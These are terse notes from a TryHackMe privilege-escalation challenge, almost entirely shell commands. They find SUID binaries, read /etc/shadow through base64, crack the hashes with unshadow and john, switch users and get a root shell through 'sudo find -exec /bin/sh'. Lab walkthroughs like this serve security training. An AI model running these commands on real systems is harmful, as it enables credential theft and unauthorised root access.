...
Notes from the TryHackMe challenge

`[leonard@ip-10-10-250-96 tmp]$ find / -perm -4000 2>/dev/null`
...
`[leonard@ip-10-10-250-96 tmp]$ base64 /etc/shadow | base64 -d`
...
`[leonard@ip-10-10-250-96 tmp]$ cat /etc/passwd`
...
`└─# /sbin/unshadow passwd.txt shadow.txt > unshadowed.txt`

`└─# /sbin/john -w=/usr/share/wordlists/rockyou.txt unshadowed.txt`
...
`[leonard@ip-10-10-250-96 tmp]$ su missy`

`[missy@ip-10-10-250-96 tmp]$ sudo -l`
...
`[missy@ip-10-10-250-96 tmp]$     sudo find . -exec /bin/sh \; -quit`
